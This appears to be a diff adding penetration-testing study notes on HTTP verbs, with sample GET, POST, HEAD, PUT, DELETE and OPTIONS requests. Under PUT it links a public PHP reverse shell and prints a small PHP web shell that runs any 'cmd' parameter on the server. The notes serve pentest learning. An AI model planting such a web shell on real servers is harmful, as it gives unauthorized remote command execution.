@@ -1,0 +1,54 @@
+HTTP Verbs
+------------------
+------------------
+GET
+------------------
+GET /index.html?course=PTS HTTP/1.1
+Host: example.site
+
+POST
+------------------
+POST /index.php HTTP/1.1
+Host: example.site
+
+username=john&password=doe
+
+HEAD
+------------------
+HEAD /index.php HTTP/1.1
+Host: example.site
+
+PUT
+------------------
+PUT <path to upload on server> HTTP/1.1
+Host: example.site
+
+<DATA to PUT>
+> https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
+> shell.php
+  <?php
+  if (isset($_GET['cmd'])
+  {
+    $cmd = $_GET['cmd'];
+    echo '<pre>';
+    $result = shell_exec($cmd);
+    echo $result;
+    echo '</pre>';
+  }
+
+
+
+DELETE
+------------------
+DELETE <path to upload on server> HTTP/1.1
+Host: example.site
+
+OPTIONS
+------------------
+OPTIONS / HTTP/1.1
+Host: example.site
+
+
+Directories and Files Enumeration
+------------------
+------------------
